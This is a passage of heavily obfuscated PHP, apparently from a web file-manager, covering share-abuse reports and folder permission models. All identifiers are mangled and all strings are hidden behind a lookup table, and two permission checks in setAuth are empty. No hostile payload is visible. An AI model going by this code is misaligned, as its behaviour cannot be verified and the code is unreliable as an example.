$¦¸…âÚ) { $ß÷§’õŸ =& $_SERVER[ï»»·÷á]; if ($î˜”ÀÁİ[$ß÷§’õŸ[497]] != $ß÷§’õŸ[88]) { return; } $‹¿éäåÉ = $¦¸…âÚ[$ß÷§’õŸ[87]][$ß÷§’õŸ[411]]; if ($¦¸…âÚ[$ß÷§’õŸ[87]][$ß÷§’õŸ[33]] != $ß÷§’õŸ[200]) { $à•Ò®† = $this->_folderReport($‹¿éäåÉ); if (!$à•Ò®†) { return; } show_json(LNG($ß÷§’õŸ[2033]) . $ß÷§’õŸ[2034] . $à•Ò®†, !1); } $«Á»²İ = Model($ß÷§’õŸ[838])->fileInfoGet($¦¸…âÚ[$ß÷§’õŸ[87]][$ß÷§’õŸ[411]]); if (!$«Á»²İ) { return; } $—°€œõ„ = $this->shareFileMeta($«Á»²İ[$ß÷§’õŸ[477]]); if (isset($—°€œõ„[$ß÷§’õŸ[374]]) && $—°€œõ„[$ß÷§’õŸ[374]] == $ß÷§’õŸ[88]) { show_json(LNG($ß÷§’õŸ[2035]), !1); } } private function _folderReport($Åö¤¿) { $ŠäËÍñË =& $_SERVER[ï»»·÷á]; $Ò¢üç¢ = array($ŠäËÍñË[477] => array($ŠäËÍñË[1022], 0), $ŠäËÍñË[762] => 3); $•·ó’À¾ = Model($ŠäËÍñË[2036])->where($Ò¢üç¢)->field($ŠäËÍñË[477])->select(); if (!$•·ó’À¾) { return !1; } $•·ó’À¾ = array_to_keyvalue($•·ó’À¾, $ŠäËÍñË[12], $ŠäËÍñË[477]); $à–¹…ƒø = $ŠäËÍñË[50] . $Åö¤¿ . $ŠäËÍñË[50]; $Ò¢üç¢ = array($ŠäËÍñË[477] => array($ŠäËÍñË[7], $•·ó’À¾), $ŠäËÍñË[520] => array($ŠäËÍñË[383], "\x25{$à–¹…ƒø}\x25"), $ŠäËÍñË[440] => 0); $­Õ¸¹©Š = Model($ŠäËÍñË[838])->where($Ò¢üç¢)->field($ŠäËÍñË[2037])->find(); if (!$­Õ¸¹©Š) { return !1; } $Â–Èå˜ = substr($­Õ¸¹©Š[$ŠäËÍñË[520]], strpos($­Õ¸¹©Š[$ŠäËÍñË[520]], $à–¹…ƒø)); $Ò¢üç¢ = array($ŠäËÍñË[411] => array($ŠäËÍñË[7], trim($Â–Èå˜, $ŠäËÍñË[50]))); $°ŠÛ÷Ú = Model($ŠäËÍñË[838])->where($Ò¢üç¢)->field($ŠäËÍñË[32])->select(); $ØŠ¶·ë™ = array_to_keyvalue($°ŠÛ÷Ú, $ŠäËÍñË[12], $ŠäËÍñË[32]); $ØŠ¶·ë™[] = $­Õ¸¹©Š[$ŠäËÍñË[32]]; return implode($ŠäËÍñË[8], $ØŠ¶·ë™); } protected function remove($­¼¦­Ø) { $å¸á©Ê˜ =& $_SERVER[ï»»·÷á]; if (is_array($­¼¦­Ø)) { $­¼¦­Ø = array($å¸á©Ê˜[7], $­¼¦­Ø); } $Çª Ú¶¤ = array($å¸á©Ê˜[602] => $­¼¦­Ø); $ØãºŒû = $this->where($Çª Ú¶¤)->delete(); if ($ØãºŒû) { Model($å¸á©Ê˜[603])->where(array($å¸á©Ê˜[602] => $­¼¦­Ø))->delete(); } $ÕÀÙå† = is_array($­¼¦­Ø) ? $­¼¦­Ø[1] : array($­¼¦­Ø); for ($èß®Ì€ = 0; $èß®Ì€ < count($ÕÀÙå†); $èß®Ì€++) { $çâøˆÌ = $this->getInfo($ÕÀÙå†[$èß®Ì€]); if ($çâøˆÌ[$å¸á©Ê˜[600]] == $å¸á©Ê˜[88]) { Model($å¸á©Ê˜[570])->eventShare($çâøˆÌ[$å¸á©Ê˜[411]], $å¸á©Ê˜[2024]); } if ($çâøˆÌ[$å¸á©Ê˜[497]] == $å¸á©Ê˜[88]) { Model($å¸á©Ê˜[570])->eventShare($çâøˆÌ[$å¸á©Ê˜[411]], $å¸á©Ê˜[2023]); } } return $ØãºŒû; } protected function removeBySource($¨¬ÏÜ¢) { $şà—‡Í =& $_SERVER[ï»»·÷á]; $´Ä†ºŒí = array($şà—‡Í[426] => array($şà—‡Í[427], $¨¬ÏÜ¢)); $¹µÏ€Ÿ‚ = $this->field($şà—‡Í[602])->where($´Ä†ºŒí)->select(); $¹µÏ€Ÿ‚ = array_to_keyvalue($¹µÏ€Ÿ‚, $şà—‡Í[12], $şà—‡Í[602]); if (!$¹µÏ€Ÿ‚) { return; } $´Ä†ºŒí = array($şà—‡Í[2030] => array($şà—‡Í[427], $¹µÏ€Ÿ‚)); $this->where($´Ä†ºŒí)->delete(); Model($şà—‡Í[603])->where($´Ä†ºŒí)->delete(); } public function listAll($´Ó£–à) { $¨úñŞÇ° =& $_SERVER[ï»»·÷á]; $…“ãûüå = array(); if ($´Ó£–à[$¨úñŞÇ°[1678]]) { $…“ãûüå[$¨úñŞÇ°[1678]] = $´Ó£–à[$¨úñŞÇ°[1678]]; } if ($´Ó£–à[$¨úñŞÇ°[773]]) { $¢™œ°©Æ = $´Ó£–à[$¨úñŞÇ°[774]] ? $´Ó£–à[$¨úñŞÇ°[774]] : strtotime(date($¨úñŞÇ°[2038])); $…“ãûüå[$¨úñŞÇ°[201]] = array($¨úñŞÇ°[333], array($´Ó£–à[$¨úñŞÇ°[773]], $¢™œ°©Æ)); } if ($´Ó£–à[$¨úñŞÇ°[33]]) { $…“ãûüå[$´Ó£–à[$¨úñŞÇ°[33]]] = 1; } else { $…“ãûüå[] = array($¨úñŞÇ°[497] => array($¨úñŞÇ°[1022], 0), $¨úñŞÇ°[600] => array($¨úñŞÇ°[1022], 0), $¨úñŞÇ°[2012] => $¨úñŞÇ°[1965]); } if ($´Ó£–à[$¨úñŞÇ°[1961]]) { $…“ãûüå[] = array($¨úñŞÇ°[2009] => $´Ó£–à[$¨úñŞÇ°[1961]], $¨úñŞÇ°[1576] => array($¨úñŞÇ°[383], "\45{$´Ó£–à[$¨úñŞÇ°[1961]]}\45"), $¨úñŞÇ°[2012] => $¨úñŞÇ°[1965]); } $É²Ç § = $this->_makeOrder()->where($…“ãûüå)->selectPage(20); if (empty($É²Ç §[$¨úñŞÇ°[369]])) { return array(); } $this->_listDataApply($É²Ç §[$¨úñŞÇ°[369]]); return $É²Ç §; } public function listDataApply($±êêôû³) { $this->_listDataApply($±êêôû³); return $±êêôû³; } private function _listDataApply(&$¨¤û²ˆè) { $ÒéŸÕÌ =& $_SERVER[ï»»·÷á]; $•É•ÏÅ¢ = array_to_keyvalue($¨¤û²ˆè, $ÒéŸÕÌ[12], $ÒéŸÕÌ[1678]); $Ü İŠ… = Model($ÒéŸÕÌ[534])->userListInfo(array_unique($•É•ÏÅ¢)); $éıôÎßÃ = array_to_keyvalue($¨¤û²ˆè, $ÒéŸÕÌ[12], $ÒéŸÕÌ[411]); $ÜĞÛÛóÌ = Model($ÒéŸÕÌ[838])->sourceListInfo($éıôÎßÃ, !0); foreach ($¨¤û²ˆè as $è¬Îøåë => &$ßˆ—Ïß¶) { $ÓîŒœãè = $ßˆ—Ïß¶[$ÒéŸÕÌ[1678]]; $ßˆ—Ïß¶[$ÒéŸÕÌ[2039]] = $Ü İŠ…[$ÓîŒœãè] ? $Ü İŠ…[$ÓîŒœãè] : !1; $¸‡äÅ¿ = $ßˆ—Ïß¶[$ÒéŸÕÌ[411]]; $ßˆ—Ïß¶[$ÒéŸÕÌ[87]] = $ÜĞÛÛóÌ[$¸‡äÅ¿] ? $ÜĞÛÛóÌ[$¸‡äÅ¿] : !1; if ($ßˆ—Ïß¶[$ÒéŸÕÌ[87]][$ÒéŸÕÌ[440]] == $ÒéŸÕÌ[88]) { unset($¨¤û²ˆè[$è¬Îøåë]); } if ($ßˆ—Ïß¶[$ÒéŸÕÌ[87]] != $ÒéŸÕÌ[198] && !$ßˆ—Ïß¶[$ÒéŸÕÌ[87]]) { unset($¨¤û²ˆè[$è¬Îøåë]); } } unset($ßˆ—Ïß¶); $¨¤û²ˆè = array_values($¨¤û²ˆè); } private function _makeOrder($°—šêüÓ = '') { $…Á‘ú´ß =& $_SERVER[ï»»·÷á]; $ÈÏ˜· = array($…Á‘ú´ß[201], $…Á‘ú´ß[774], $…Á‘ú´ß[2026], $…Á‘ú´ß[2027]); $şÖçê = array($…Á‘ú´ß[459] => $…Á‘ú´ß[460], $…Á‘ú´ß[461] => $…Á‘ú´ß[462]); $±æÆ´Î­ = Input::get($…Á‘ú´ß[466], $…Á‘ú´ß[7], $…Á‘ú´ß[432], $ÈÏ˜·); $Û¬¡‡Ôù = Input::get($…Á‘ú´ß[467], $…Á‘ú´ß[7], $…Á‘ú´ß[2040], array($…Á‘ú´ß[1958], $…Á‘ú´ß[461])); $Û¬¡‡Ôù = $şÖçê[$Û¬¡‡Ôù]; $°—šêüÓ = $°—šêüÓ . "{$±æÆ´Î­}\40{$Û¬¡‡Ôù}"; return $this->order($°—šêüÓ); } public function reportAdd($¿äƒ¤íå) { $À¹¤«¶¿ =& $_SERVER[ï»»·÷á]; $ÏÒ®ÕÑÛ = array($À¹¤«¶¿[602] => $¿äƒ¤íå[$À¹¤«¶¿[602]], $À¹¤«¶¿[1678] => USER_ID); if (Model($À¹¤«¶¿[2036])->where($ÏÒ®ÕÑÛ)->find()) { return !1; } $Æøµ‹˜¹ = array($À¹¤«¶¿[602] => $¿äƒ¤íå[$À¹¤«¶¿[602]], $À¹¤«¶¿[1576] => $¿äƒ¤íå[$À¹¤«¶¿[1576]], $À¹¤«¶¿[411] => $¿äƒ¤íå[$À¹¤«¶¿[411]], $À¹¤«¶¿[477] => $¿äƒ¤íå[$À¹¤«¶¿[477]], $À¹¤«¶¿[1678] => USER_ID, $À¹¤«¶¿[33] => $¿äƒ¤íå[$À¹¤«¶¿[33]], $À¹¤«¶¿[462] => $¿äƒ¤íå[$À¹¤«¶¿[462]]); return Model($À¹¤«¶¿[2036])->add($Æøµ‹˜¹); } public function reportList($Õ“•»—) { $’Áƒåş =& $_SERVER[ï»»·÷á]; $–Ó½ƒ§– = array(); if ($Õ“•»—[$’Áƒåş[773]]) { $ıæºÀ€Ï = $Õ“•»—[$’Áƒåş[774]] ? $Õ“•»—[$’Áƒåş[774]] : strtotime(date($’Áƒåş[2038])); $–Ó½ƒ§–[$’Áƒåş[201]] = array($’Áƒåş[333], array($Õ“•»—[$’Áƒåş[773]], $ıæºÀ€Ï)); } if (isset($Õ“•»—[$’Áƒåş[33]]) && in_array($Õ“•»—[$’Áƒåş[33]], array($’Áƒåş[88], $’Áƒåş[446], $’Áƒåş[2041], $’Áƒåş[2042], $’Áƒåş[2043]))) { $–Ó½ƒ§–[$’Áƒåş[33]] = $Õ“•»—[$’Áƒåş[33]]; } if (isset($Õ“•»—[$’Áƒåş[762]]) && in_array($Õ“•»—[$’Áƒåş[762]], array($’Áƒåş[198], $’Áƒåş[88], $’Áƒåş[446], $’Áƒåş[2041]))) { $–Ó½ƒ§–[$’Áƒåş[762]] = $Õ“•»—[$’Áƒåş[762]]; } $ƒ÷‡æûÚ = Input::get($’Áƒåş[467], $’Áƒåş[7], $’Áƒåş[2040], array($’Áƒåş[1958], $’Áƒåş[461])); $ğŸßå¾„ = array($’Áƒåş[459] => $’Áƒåş[460], $’Áƒåş[461] => $’Áƒåş[462]); $„áºÉ×À = $’Áƒåş[2044] . $ğŸßå¾„[$ƒ÷‡æûÚ]; $åâ”÷Ó— = Model($’Áƒåş[2036])->where($–Ó½ƒ§–)->order($„áºÉ×À)->selectPage(20); if (empty($åâ”÷Ó—[$’Áƒåş[369]])) { return array(); } $È¿åøí = array_to_keyvalue_group($åâ”÷Ó—[$’Áƒåş[369]], $’Áƒåş[762], $’Áƒåş[602]); if (!empty($È¿åøí[0])) { $Õ“•»— = $È¿åøí[0]; $–Ó½ƒ§– = array($’Áƒåş[602] => array($’Áƒåş[7], $Õ“•»—)); $ÈÙÄˆÆ¹ = $this->where($–Ó½ƒ§–)->field($’Áƒåş[602])->select(); $ÈÙÄˆÆ¹ = array_to_keyvalue($ÈÙÄˆÆ¹, $’Áƒåş[12], $’Áƒåş[602]); $ûİœ¢ÌÎ = array_diff($Õ“•»—, $ÈÙÄˆÆ¹); if (!empty($ûİœ¢ÌÎ)) { foreach ($åâ”÷Ó—[$’Áƒåş[369]] as $‚€î©İé => $‘åé™ºó) { if (in_array($‘åé™ºó[$’Áƒåş[602]], $ûİœ¢ÌÎ)) { unset($åâ”÷Ó—[$’Áƒåş[369]][$‚€î©İé]); } } } } $this->_listDataApply($åâ”÷Ó—[$’Áƒåş[369]]); return $åâ”÷Ó—; } public function reportStatus($¢Û¤¦‰Ú) { $‚ôšüŒó =& $_SERVER[ï»»·÷á]; $¤—¤Ê¼  = array($‚ôšüŒó[399] => $¢Û¤¦‰Ú[$‚ôšüŒó[399]]); $ºÉûº°¡ = Model($‚ôšüŒó[2036])->where($¤—¤Ê¼ )->field($‚ôšüŒó[2045])->find(); if (!$ºÉûº°¡) { return !1; } $©Ó•şŞƒ = array($‚ôšüŒó[762] => $¢Û¤¦‰Ú[$‚ôšüŒó[762]]); if ($¢Û¤¦‰Ú[$‚ôšüŒó[762]] == $‚ôšüŒó[2041] && $ºÉûº°¡[$‚ôšüŒó[762]] == $‚ôšüŒó[2041]) { $©Ó•şŞƒ[$‚ôšüŒó[762]] = 0; } $…öøªıë = Model($‚ôšüŒó[2036])->where($¤—¤Ê¼ )->save($©Ó•şŞƒ); if ($¢Û¤¦‰Ú[$‚ôšüŒó[762]] == $‚ôšüŒó[446]) { if ($ºÉûº°¡[$‚ôšüŒó[477]] != $‚ôšüŒó[198] && $this->shareFileMeta($ºÉûº°¡[$‚ôšüŒó[477]])) { $this->shareFileMeta($ºÉûº°¡[$‚ôšüŒó[477]], 0); } $this->remove($ºÉûº°¡[$‚ôšüŒó[602]]); return !0; } if ($…öøªıë && $¢Û¤¦‰Ú[$‚ôšüŒó[762]] == $‚ôšüŒó[2041]) { $ı©Ãµ¢ = $©Ó•şŞƒ[$‚ôšüŒó[762]] == $‚ôšüŒó[2041] ? 1 : 0; $this->shareFileMeta($ºÉûº°¡[$‚ôšüŒó[477]], $ı©Ãµ¢); $this->removeByFile($ºÉûº°¡[$‚ôšüŒó[477]]); } return $…öøªıë; } private function removeByFile($Ä™í¯§ê) { $í„É¿ =& $_SERVER[ï»»·÷á]; $î€ÍåİŞ = Model($í„É¿[838])->where(array($í„É¿[477] => $Ä™í¯§ê))->field($í„É¿[411])->select(); $‡ş³¿ü± = array_to_keyvalue($î€ÍåİŞ, $í„É¿[12], $í„É¿[411]); $Ãù€™ä½ = array($í„É¿[411] => array($í„É¿[7], $‡ş³¿ü±), $í„É¿[497] => 1); $î€ÍåİŞ = $this->where($Ãù€™ä½)->field($í„É¿[602])->select(); if (empty($î€ÍåİŞ)) { return; } $³³ÀÜ”Ş = array_to_keyvalue($î€ÍåİŞ, $í„É¿[12], $í„É¿[602]); $this->remove($³³ÀÜ”Ş); } private function shareFileMeta($±È§É÷©, $ş„Åõù¬ = null) { $üÜ×áó =& $_SERVER[ï»»·÷á]; $÷ÙµØˆ = array($üÜ×áó[477] => $±È§É÷©, $üÜ×áó[94] => $üÜ×áó[2046]); if (is_null($ş„Åõù¬)) { return Model($üÜ×áó[2047])->where($÷ÙµØˆ)->find(); } $÷ÙµØˆ[$üÜ×áó[374]] = $ş„Åõù¬; Model($üÜ×áó[2047])->add($÷ÙµØˆ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\x75\162\x63\145\137\141\165\x74\150"; public function getAuth($óÊàûÙ) { $Ğ˜ÑáÀ« =& $_SERVER[ï»»·÷á]; $ü£«¶Š» = $this->sourceAuthSelect($óÊàûÙ); $±¸Ã«Ò = array(); $Ô÷ú™¿æ = array(); $Ãú«Ë‡Ø = 2 << 25; foreach ($ü£«¶Š» as $â‘¸ä°®) { $…ª”›¥ = Model($Ğ˜ÑáÀ«[507])->listData($â‘¸ä°®[$Ğ˜ÑáÀ«[1971]]); if (!$…ª”›¥) { continue; } $±¸Ã«Ò[] = $â‘¸ä°®; $Š¿ÇÀ·ˆ = 0; if ($â‘¸ä°®[$Ğ˜ÑáÀ«[420]] == SourceModel::TYPE_GROUP) { $Š¿ÇÀ·ˆ = $Ãú«Ë‡Ø * 2; } if ($â‘¸ä°®[$Ğ˜ÑáÀ«[420]] == SourceModel::TYPE_USER) { $Š¿ÇÀ·ˆ = $Ãú«Ë‡Ø; } if ($â‘¸ä°®[$Ğ˜ÑáÀ«[420]] == SourceModel::TYPE_USER && $â‘¸ä°®[$Ğ˜ÑáÀ«[505]] == $Ğ˜ÑáÀ«[198]) { $Š¿ÇÀ·ˆ = 0; } $Ô÷ú™¿æ[] = $…ª”›¥[$Ğ˜ÑáÀ«[422]] + $Š¿ÇÀ·ˆ; } array_multisort($Ô÷ú™¿æ, SORT_DESC, $±¸Ã«Ò); return $±¸Ã«Ò; } public function sourceAuthSelect($ÎÚ¿ùõ€) { $’ˆÔÒª =& $_SERVER[ï»»·÷á]; static $î…îñ‚” = array(); $Û©£òà° = is_array($ÎÚ¿ùõ€) ? !1 : !0; if ($Û©£òà°) { $ÎÚ¿ùõ€ = array($ÎÚ¿ùõ€); } $³ıûÏ‡ = array(); foreach ($ÎÚ¿ùõ€ as $ºŠØ‡±) { if (isset($î…îñ‚”[$ºŠØ‡±])) { $³ıûÏ‡[$ºŠØ‡±] = $î…îñ‚”[$ºŠØ‡±]; } } if (count($³ıûÏ‡) == count($ÎÚ¿ùõ€)) { return $Û©£òà° ? $³ıûÏ‡[$ÎÚ¿ùõ€[0]] : $³ıûÏ‡; } $ëç“©ÛÜ = $’ˆÔÒª[2048]; $†±–ØÔ™ = array($’ˆÔÒª[411] => array($’ˆÔÒª[7], $ÎÚ¿ùõ€)); $Ÿ‡•»… = $this->field($ëç“©ÛÜ)->order($’ˆÔÒª[399])->where($†±–ØÔ™)->select(); $üìâ“¸ = array_to_keyvalue_group($Ÿ‡•»…, $’ˆÔÒª[411]); foreach ($ÎÚ¿ùõ€ as $ºŠØ‡±) { $î…îñ‚”[$ºŠØ‡±] = $üìâ“¸[$ºŠØ‡±] ? $üìâ“¸[$ºŠØ‡±] : array(); } if ($Û©£òà°) { return $Ÿ‡•»…; } return $üìâ“¸; } public function setAuth($åØö²ÚÊ, $ÜÒª¬’Û) { $¨çÛ¬Ğ’ =& $_SERVER[ï»»·÷á]; $şúß¥‡€ = Model($¨çÛ¬Ğ’[1349])->sourceInfo($åØö²ÚÊ); if (!$şúß¥‡€) { return !1; } if ($şúß¥‡€[$¨çÛ¬Ğ’[420]] != SourceModel::TYPE_GROUP) { return !1; } $¼Ö²Ùƒ¤ = 1; $õÀÊÁ = $şúß¥‡€[$¨çÛ¬Ğ’[505]]; if ($õÀÊÁ != $¼Ö²Ùƒ¤) { $à¶¸ø—Ö = array($¨çÛ¬Ğ’[1867] => $õÀÊÁ); $ğ²å”«ò = Model($¨çÛ¬Ğ’[1957])->field($¨çÛ¬Ğ’[1678])->where($à¶¸ø—Ö)->select(); $ğ²å”«ò = array_to_keyvalue($ğ²å”«ò, $¨çÛ¬Ğ’[12], $¨çÛ¬Ğ’[1678]); } $ıí€  = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $”¿®Á˜ = array(); foreach ($ÜÒª¬’Û as $ÛÇÀíœÊ) { if (!in_array($ÛÇÀíœÊ[$¨çÛ¬Ğ’[420]], $ıí€ )) { show_json(LNG($¨çÛ¬Ğ’[2049]), !1); } if ($õÀÊÁ != $¼Ö²Ùƒ¤) { if ($ÛÇÀíœÊ[$¨çÛ¬Ğ’[420]] == SourceModel::TYPE_GROUP) { } if ($ÛÇÀíœÊ[$¨çÛ¬Ğ’[505]] != 0 && !in_array($ÛÇÀíœÊ[$¨çÛ¬Ğ’[505]], $ğ²å”«ò)) { } } if ($ÛÇÀíœÊ[$¨çÛ¬Ğ’[505]] == 0) { $ÛÇÀíœÊ[$¨çÛ¬Ğ’[420]] = SourceModel::TYPE_USER; } $”¿®Á˜[] = array($¨çÛ¬Ğ’[411] => $åØö²ÚÊ, $¨çÛ¬Ğ’[420] => intval($ÛÇÀíœÊ[$¨çÛ¬Ğ’[420]]), $¨çÛ¬Ğ’[505] => intval($ÛÇÀíœÊ[$¨çÛ¬Ğ’[505]]), $¨çÛ¬Ğ’[1971] => intval($ÛÇÀíœÊ[$¨çÛ¬Ğ’[1971]]) ? intval($ÛÇÀíœÊ[$¨çÛ¬Ğ’[1971]]) : 0, $¨çÛ¬Ğ’[2031] => intval($ÛÇÀíœÊ[$¨çÛ¬Ğ’[2031]]) ? intval($ÛÇÀíœÊ[$¨çÛ¬Ğ’[2031]]) : -1); } $this->where(array($¨çÛ¬Ğ’[426] => $åØö²ÚÊ))->delete(); $this->addAll($”¿®Á˜); return !0; } public function authClear($Â±ŒÛŒŠ) { $æõš¡· =& $_SERVER[ï»»·÷á]; $Ğ‘èëµ = Model($æõš¡·[1349])->sourceInfo($Â±ŒÛŒŠ); $÷¿•‡Êˆ = array($Â±ŒÛŒŠ); if ($Ğ‘èëµ[$æõš¡·[419]] == $æõš¡·[88]) { $Ğõ×À˜š = array($æõš¡·[589] => array($æõš¡·[549], $Ğ‘èëµ[$æõš¡·[520]] . $Â±ŒÛŒŠ . $æõš¡·[550])); $÷¿•‡Êˆ = Model($æõš¡·[1349])->field($æõš¡·[426])->where($Ğõ×À˜š)->getField($æõš¡·[411], !0); $÷¿•‡Êˆ[] = $Â±ŒÛŒŠ; } $this->where(array($æõš¡·[426] => array($æõš¡·[427], $÷¿•‡Êˆ)))->delete(); return !0; } public function getAllChildren($’¡¸ïÍĞ) { $÷»´ƒˆİ =& $_SERVER[ï»»·÷á]; $ÛßÊ©Õû = Model($÷»´ƒˆİ[1349])->sourceInfo($’¡¸ïÍĞ); if ($ÛßÊ©Õû[$÷»´ƒˆİ[419]] != $÷»´ƒˆİ[88]) { return $this->sourceListAuth(array($’¡¸ïÍĞ)); } if ($ÛßÊ©Õû[$÷»´ƒˆİ[420]] != SourceModel::TYPE_GROUP) { return array(); } $ë›êÌú = 1; $ÓæÆÛ› = array($’¡¸ïÍĞ); if ($ÛßÊ©Õû[$÷»´ƒˆİ[441]] == $÷»´ƒˆİ[198] && $ÛßÊ©Õû[$÷»´ƒˆİ[505]] != $ë›êÌú) { $ÓæÆÛ› = $this->groupChidldAllRootSource($ÛßÊ©Õû[$÷»´ƒˆİ[505]]); } $’•ƒÜ‚ì = $this->field($÷»´ƒˆİ[411])->group($÷»´ƒˆİ[411])->select(); $’•ƒÜ‚ì = array_to_keyvalue($’•ƒÜ‚ì, $÷»´ƒˆİ[12], $÷»´ƒˆİ[411]); if (!$’•ƒÜ‚ì) { return array(); } $º…“‰ğ = $÷»´ƒˆİ[2050]; $‘å Æ·¤ = array($÷»´ƒˆİ[411] => array($÷»´ƒˆİ[7], $’•ƒÜ‚ì), $÷»´ƒˆİ[440] => $÷»´ƒˆİ[198]); $’¥ºÊü = Model($÷»´ƒˆİ[838])->field($º…“‰ğ)->where($‘å Æ·¤)->select(); $î«Íñ¾× = array($’¡¸ïÍĞ); foreach ($’¥ºÊü as $âöÎ¯è) { foreach ($ÓæÆÛ› as $ŞºØ†¤ª) { $ËïÀÓ„ã = $÷»´ƒˆİ[50] . $ŞºØ†¤ª . $÷»´ƒˆİ[50]; $•´»ÀĞç = $âöÎ¯è[$÷»´ƒˆİ[520]] . $âöÎ¯è[$÷»´ƒˆİ[411]] . $÷»´ƒˆİ[50]; if (strstr($•´»ÀĞç, $ËïÀÓ„ã)) { $î«Íñ¾×[] = $âöÎ¯è[$÷»´ƒˆİ[411]]; break; } } } return $this->sourceListAuth($î«Íñ¾×); } private function sourceListAuth($Çş©±ãë) { $öİ³øõ¯ =& $_SERVER[ï»»·÷á]; $÷×õşíé = Model($öİ³øõ¯[1349])->sourceListInfo($Çş©±ãë, !0); $”õ¬è¶ñ = $this->sourceAuthSelect($Çş©±ãë); $ÒŒĞ×ŒÈ = array(); $·ˆ“ŠÑ = array(); foreach ($÷×õşíé as $²ğí½‚ğ) { unset($²ğí½‚ğ[$öİ³øõ¯[465]]); unset($²ğí½‚ğ[$öİ³øõ¯[463]]); unset($²ğí½‚ğ[$öİ³øõ¯[422]]); unset($²ğí½‚ğ[$öİ³øõ¯[87]]); $ö›şä = $”õ¬è¶ñ[$²ğí½‚ğ[$öİ³øõ¯[411]]]; if (!$ö›şä) { continue; } $²ğí½‚ğ[$öİ³øõ¯[2051]] = $this->authTargetInfo($ö›şä); $²ğí½‚ğ[$öİ³øõ¯[518]] = rtrim($²ğí½‚ğ[$öİ³øõ¯[524]], $öİ³øõ¯[8]) . $öİ³øõ¯[8] . ltrim($²ğí½‚ğ[$öİ³øõ¯[518]], $öİ³øõ¯[8]); $ÒŒĞ×ŒÈ[] = $²ğí½‚ğ; $â±î•ºİ = count(explode($öİ³øõ¯[8], trim($²ğí½‚ğ[$öİ³øõ¯[518]], $öİ³øõ¯[8]))); $·ˆ“ŠÑ[] = $â±î•ºİ + ($²ğí½‚ğ[$öİ³øõ¯[33]] == $öİ³øõ¯[75] ? 0 : 1000); } array_multisort($·ˆ“ŠÑ, SORT_ASC, $ÒŒĞ×ŒÈ); return $ÒŒĞ×ŒÈ; } private function groupChidldAllRootSource($Å¢¿ôüÏ) { $Óû‚‚–³ =& $_SERVER[ï»»·÷á]; $Ç‰¨ùŒ = Model($Óû‚‚–³[2052])->groupChildrenAll($Å¢¿ôüÏ); $ã ”ŸüÌ = array($Óû‚‚–³[441] => 0, $Óû‚‚–³[505] => array($Óû‚‚–³[7], $Ç‰¨ùŒ), $Óû‚‚–³[420] => SourceModel::TYPE_GROUP); $ÒÛä”ÓÔ = Model($Óû‚‚–³[838])->field($Óû‚‚–³[411])->where($ã ”ŸüÌ)->select(); $ÒÛä”ÓÔ = array_to_keyvalue($ÒÛä”ÓÔ, $Óû‚‚–³[12], $Óû‚‚–³[411]); return $ÒÛä”ÓÔ; } private function authTargetInfo($ßğ„¡†ı) { $¢‚§õğÀ =& $_SERVER[ï»»·÷á]; $Å¬‡¹Ç = array(); $˜Ì˜µÇ = array(); $ëåÌïú¹ = 2 << 25; foreach ($ßğ„¡†ı as $´·‰¸­•) { $¶ÕÕ¯ = Model($¢‚§õğÀ[507])->listData($´·‰¸­•[$¢‚§õğÀ[1971]]); if (!$¶ÕÕ¯) { continue; } if ($´·‰¸­•[$¢‚§õğÀ[420]] == SourceModel::TYPE_USER) { $•ìĞ¦ö = Model($¢‚§õğÀ[513])->getInfoSimpleOuter($´·‰¸­•[$¢‚§õğÀ[505]]); if ($•ìĞ¦ö[$¢‚§õğÀ[1678]] == $¢‚§õğÀ[1198]) { continue; } if ($•ìĞ¦ö[$¢‚§õğÀ[1678]] == $¢‚§õğÀ[198]) { $•ìĞ¦ö[$¢‚§õğÀ[32]] = LNG($¢‚§õğÀ[2053]); } } else { $•ìĞ¦ö = Model($¢‚§õğÀ[521])->getInfoSimple($´·‰¸­•[$¢‚§õğÀ[505]]); } if (!$•ìĞ¦ö) { continue; } $•ìĞ¦ö[$¢‚§õğÀ[476]] = $¶ÕÕ¯; $Å¬‡¹Ç[] = $•ìĞ¦ö; $Î’–İÜù = 0; if ($´·‰¸­•[$¢‚§õğÀ[420]] == SourceModel::TYPE_GROUP) { $Î’–İÜù = $ëåÌïú¹ * 2; } if ($´·‰¸­•[$¢‚§õğÀ[420]] == SourceModel::TYPE_USER) { $Î’–İÜù = $ëåÌïú¹; } if ($´·‰¸­•[$¢‚§õğÀ[420]] == SourceModel::TYPE_USER && $´·‰¸­•[$¢‚§õğÀ[505]] == $¢‚§õğÀ[198]) { $Î’–İÜù = 0; } $˜Ì˜µÇ[] = $¶ÕÕ¯[$¢‚§õğÀ[422]] + $Î’–İÜù; } array_multisort($˜Ì˜µÇ, SORT_DESC, $Å¬‡¹Ç); return $Å¬‡¹Ç; } public function getAllChildrenByUser($Ÿ”ÈîÄ, $ó£²¡£ñ) { $æ·—´¬• =& $_SERVER[ï»»·÷á]; $Êï¾ÂÓ = Model($æ·—´¬•[534])->getInfo($ó£²¡£ñ); if (!$ó£²¡£ñ || !$Ÿ”ÈîÄ || !$Êï¾ÂÓ) { return array(); } $åú„£¡Ø = Model($æ·—´¬•[1349])->sourceInfo($Ÿ”ÈîÄ); $‚ˆê’â = array(); $£Ïˆ“ğş = 1; if ($åú„£¡Ø[$æ·—´¬•[441]] == $æ·—´¬•[198] && $åú„£¡Ø[$æ·—´¬•[505]] != $£Ïˆ“ğş && $this->groupContainUser($åú„£¡Ø[$æ·—´¬•[505]], $ó£²¡£ñ)) { foreach ($Êï¾ÂÓ[$æ·—´¬•[2054]] as $½–Ó´Âš) { $Ò…ù›ï¼ = Model($æ·—´¬•[521])->getInfo($½–Ó´Âš[$æ·—´¬•[1867]]); $ŒÈú…íØ = Model($æ·—´¬•[534])->getInfoSimpleOuter($ó£²¡£ñ); $ŒÈú…íØ[$æ·—´¬•[476]] = $½–Ó´Âš[$æ·—´¬•[422]]; if (Model($æ·—´¬•[507])->authCheckAction($½–Ó´Âš[$æ·—´¬•[422]][$æ·—´¬•[422]], $æ·—´¬•[1888])) { continue; } $€û¼ÈÄ = array($æ·—´¬•[32] => $æ·—´¬•[1218] . $Ò…ù›ï¼[$æ·—´¬•[32]], $æ·—´¬•[411] => $Ò…ù›ï¼[$æ·—´¬•[87]][$æ·—´¬•[411]], $æ·—´¬•[84] => KodIO::make($Ò…ù›ï¼[$æ·—´¬•[87]][$æ·—´¬•[411]]), $æ·—´¬•[441] => $æ·—´¬•[198], $æ·—´¬•[420] => $æ·—´¬•[514], $æ·—´¬•[33] => $æ·—´¬•[553], $æ·—´¬•[518] => 